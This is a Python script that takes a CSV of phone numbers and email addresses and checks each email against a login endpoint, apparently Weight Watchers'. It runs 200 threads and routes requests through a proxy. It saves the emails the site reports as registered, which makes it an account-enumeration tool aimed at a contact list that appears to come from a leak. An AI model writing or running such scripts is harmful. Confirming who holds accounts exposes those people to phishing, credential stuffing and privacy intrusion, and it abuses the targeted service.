import requests
import json
import concurrent.futures
import traceback
import time
import gc

from py.config import headers,proxy,url
from py.csv_handler import csv_handler  
from py.logs_handler import logs_handler

def checker(rec):
    global count
    email = str(rec[1])
    phone = str(rec[0])
    done = False
    errors = 0
    while not done:
        try:
            with requests.Session() as s:
                s.headers.update(headers)
                r = s.post(url, data=json.dumps({'value':email}),timeout=10,proxies=proxy)
                response = r.json()
                if "200" in str(r):
                    answer = str(response["data"]["loginView"])
                    if (answer == "2") or (answer == "4"):
                        chunk_results.append((phone,email,"Registered"))
                    done = True
                    count +=1
                    
                else:
                    raise Exception("Response isn't 200")
        except Exception as exc:
            errors+=1
            if errors > 5:
                with open('logs.txt', 'a') as f:
                    f.write("\n")
                    f.write(str(exc))
                    log.add_records_to_logs(traceback.print_exc())
                done = True
                count +=1
                skipped_emails.append((phone,email))
            
    if (count%500==0 and count !=0):
        log.add_records_to_logs(f"{count} emails checked.")
        print(f"{count} emails checked.")


def main(start_from):
    global log
    global count
    global skipped_emails
    global chunk_results

    log = logs_handler("Logs/WeightWatchers")
    csv_handler.create("WeightWatchers")
    csv_handler.skipped_create()

    records_len = len(csv_handler.read(input_file_name=InputName))
    for number in range(start_from,records_len,ChunkSize):
        #Clearing lists and creating index where to start from
        all_records = []
        skipped_emails = []
        chunk_results = []
        chunk = []
        count = 0

        all_records = csv_handler.read(input_file_name=InputName)
        
        for x in range(number,number+ChunkSize):
            #Filling chunk with records to process
            try:
                chunk.append(all_records[x])
            except Exception as exc:
                print(exc)
                break
        all_records = [] 

        print(f"Scraping {number}-{number+ChunkSize}.")
        log.add_records_to_logs(f"Scraping {number}-{number+ChunkSize}.")

        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=MaxWorkers) as executor:
            executor.map(checker,chunk)
        end = time.time()

        log.add_records_to_logs(f"Total: {end-start}")

        gc.collect()

        csv_handler.save(records_to_save=chunk_results)
        csv_handler.skipped_save(records=skipped_emails)

        print(f"Chunk complete. {len(skipped_emails)} email skipped.")
        log.add_records_to_logs(f"Chunk complete.")


MaxWorkers = 200
ChunkSize = 10000
InputName = "ChrisjankonRecreated"

main(0)

